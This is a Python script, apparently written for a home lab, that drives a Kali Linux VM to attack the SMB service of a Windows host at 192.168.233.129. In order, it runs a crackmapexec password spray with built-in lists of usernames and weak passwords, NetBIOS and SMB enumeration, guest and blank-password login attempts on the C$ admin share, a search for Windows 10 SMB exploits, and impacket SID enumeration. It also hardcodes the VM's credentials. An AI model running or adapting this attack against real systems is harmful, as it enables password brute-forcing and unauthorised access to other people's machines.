#!/usr/bin/env python3
"""Step 3: Deep SMB attack - crackmapexec + password spray + nbtstat"""
import subprocess
import os

VMRUN = r'D:\software\vmware\tool\vmrun.exe'
VMX = r'E:\BaiduNetdiskDownload\kali-linux-2026.1-vmware-amd64.vmwarevm\kali-linux-2026.1-vmware-amd64.vmx'
TEMP = os.environ.get('TEMP', r'C:\Users\xianyv\AppData\Local\Temp')

def run_kali(cmd, timeout=120):
    script_path = os.path.join(TEMP, 'kali_cmd.sh')
    with open(script_path, 'w', encoding='utf-8', newline='\n') as f:
        f.write(f'#!/bin/bash\n{cmd}\n')
    subprocess.run([VMRUN, '-T', 'ws', '-gu', 'kali', '-gp', 'kali',
                    'copyFileFromHostToGuest', VMX,
                    script_path, '/tmp/kali_cmd.sh'],
                   capture_output=True, text=True, timeout=30)
    subprocess.run([VMRUN, '-T', 'ws', '-gu', 'kali', '-gp', 'kali',
                    'runProgramInGuest', VMX,
                    '/bin/bash', '-c',
                    f'chmod +x /tmp/kali_cmd.sh && timeout {timeout} /tmp/kali_cmd.sh > /tmp/kali_out.txt 2>&1'],
                   capture_output=True, text=True, timeout=timeout + 30)
    out_path = os.path.join(TEMP, 'kali_out.txt')
    subprocess.run([VMRUN, '-T', 'ws', '-gu', 'kali', '-gp', 'kali',
                    'copyFileFromGuestToHost', VMX,
                    '/tmp/kali_out.txt', out_path],
                   capture_output=True, text=True, timeout=30)
    try:
        with open(out_path, 'r', encoding='utf-8', errors='ignore') as f:
            return f.read()
    except:
        return "[READ ERROR]"

# 1. crackmapexec SMB spray
print("=" * 60)
print("[1] CrackMapExec SMB password spray")
print("=" * 60)
out = run_kali(
    "printf 'lkjm\\nadministrator\\nadmin\\nguest\\nuser\\ntest\\n' > /tmp/users.txt && "
    "printf '\\n123\\n1234\\n123456\\n12345678\\npassword\\nPassword1\\nadmin\\nadmin123\\n"
    "P@ssw0rd\\nqwerty\\nabc123\\nWelcome1\\nletmein\\nlkjm\\nlkjm123\\ntest\\ntest123\\n"
    "root\\nchangeme\\n000000\\n111111\\nWindows1\\nvmware\\n"
    "Aa123456\\n1qaz2wsx\\nq1w2e3r4\\nAdmin@123\\nP@ss1234\\nPassw0rd\\n"
    "123456789\\npassword1\\n' > /tmp/passes.txt && "
    "crackmapexec smb 192.168.233.129 -u /tmp/users.txt -p /tmp/passes.txt --continue-on-success 2>&1 | head -100",
    timeout=300
)
print(out)

# 2. nbtstat
print("\n" + "=" * 60)
print("[2] NBTSTAT + NetBIOS enumeration")
print("=" * 60)
out = run_kali(f"nbtscan 192.168.233.129 2>&1 && echo '---' && nmblookup -A 192.168.233.129 2>&1", timeout=30)
print(out)

# 3. SMB2 dialect + signing
print("\n" + "=" * 60)
print("[3] SMB2 dialect and signing check")
print("=" * 60)
out = run_kali(f"echo kali | sudo -S nmap -p 445 --script smb2-security-mode 192.168.233.129 2>&1", timeout=60)
print(out)

# 4. SMB protocols
print("\n" + "=" * 60)
print("[4] SMB protocols enumeration")
print("=" * 60)
out = run_kali(f"smbclient -L //192.168.233.129/ -m SMB3 -N 2>&1 && echo '---SMB2---' && smbclient -L //192.168.233.129/ -m SMB2 -N 2>&1", timeout=30)
print(out)

# 5. Try guest with different approaches
print("\n" + "=" * 60)
print("[5] Guest account access attempts")
print("=" * 60)
out = run_kali(
    f"echo '=== guest:guest ===' && smbclient //192.168.233.129/C$ -U 'guest%guest' -c 'ls' 2>&1 && "
    f"echo '=== guest:(blank) ===' && smbclient //192.168.233.129/C$ -U 'guest%' -c 'ls' 2>&1 && "
    f"echo '=== administrator:(blank) ===' && smbclient //192.168.233.129/C$ -U 'administrator%' -c 'ls' 2>&1 && "
    f"echo '=== lkjm:lkjm ===' && smbclient //192.168.233.129/C$ -U 'lkjm%lkjm' -c 'ls' 2>&1",
    timeout=30
)
print(out)

# 6. Search for SMB exploits
print("\n" + "=" * 60)
print("[6] SearchSploit - Windows 10 SMB exploits")
print("=" * 60)
out = run_kali(f"searchsploit windows 10 smb 2>&1 | head -40", timeout=30)
print(out)

# 7. Check for CVE-2020-0796 (SMBGhost)
print("\n" + "=" * 60)
print("[7] SMBGhost (CVE-2020-0796) check")
print("=" * 60)
out = run_kali(f"echo kali | sudo -S nmap -p 445 --script smb-protocols 192.168.233.129 2>&1", timeout=60)
print(out)

# 8. Try impacket tools
print("\n" + "=" * 60)
print("[8] Impacket secretsdump / getarch")
print("=" * 60)
out = run_kali(
    f"impacket-smbclient 'guest:@192.168.233.129' 2>&1 && "
    f"echo '---' && impacket-lookupsid 'guest:@192.168.233.129' 2>&1 | head -30",
    timeout=30
)
print(out)

print("\n" + "=" * 60)
print("DEEP SCAN COMPLETE")
print("=" * 60)
